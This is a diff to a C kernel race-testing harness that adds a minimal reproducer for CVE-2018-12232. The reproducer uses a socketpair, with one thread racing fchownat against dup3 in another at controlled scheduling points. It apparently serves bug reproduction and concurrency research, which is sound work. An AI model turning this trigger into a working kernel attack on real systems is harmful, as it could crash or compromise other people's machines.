@@ -12,6 +12,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#include <sys/socket.h>
 #include <sys/syscall.h>
 #include <termios.h>
 #include <unistd.h>
@@ -39,6 +40,7 @@ enum qcschedpoint_footprint {
     footprint_not_addressed,
 };
 
+int fds[2];
 int fd0 = -1;
 int vm;
 
@@ -100,6 +102,9 @@ struct schedpoint sched1[] = {
 #if defined(CVE20172636_MINIMAL)
 #include "schedpoint/cve-2017-2636-minimal-1.h"
 #endif
+#if defined(CVE201812232_MINIMAL)
+#include "schedpoint/cve-2018-12232-minimal-1.h"
+#endif
 };
 
 struct schedpoint sched2[] = {
@@ -117,6 +122,9 @@ struct schedpoint sched2[] = {
 #endif
 #if defined(CVE20172636_MINIMAL)
 #include "schedpoint/cve-2017-2636-minimal-2.h"
+#endif
+#if defined(CVE201812232_MINIMAL)
+#include "schedpoint/cve-2018-12232-minimal-2.h"
 #endif
 };
 
@@ -213,6 +221,12 @@ static void *th1(void *gop)
 #if defined(CVE20172636_MINIMAL)
     ioctl(fd0, TCXONC, TCOON);
 #endif
+#if defined(CVE201812232_MINIMAL)
+    int r2, r3;
+    r2 = getuid();
+    r3 = getegid();
+    fchownat(fds[0], "", r2, r3, 0x1000);
+#endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
     defined(FOOTPRINT_TEST)
     int typ = 1;
@@ -239,6 +253,9 @@ static void *th2(void *gop)
 #endif
 #if defined(CVE20172636_MINIMAL)
     ioctl(fd0, TCFLSH, TCIOFLUSH);
+#endif
+#if defined(CVE201812232_MINIMAL)
+    dup3(fds[1], fds[0], 0x80000);
 #endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
     defined(FOOTPRINT_TEST)
@@ -289,6 +306,9 @@ static void init()
     ioctl(fd0, TIOCSETD, &n_hdlc);
     ioctl(fd0, TCXONC, TCOOFF);
     write(fd0, buf, 100);
+#endif
+#if defined(CVE201812232_MINIMAL)
+    socketpair(AF_UNIX, SOCK_STREAM, 0x0, fds);
 #endif
 }
 
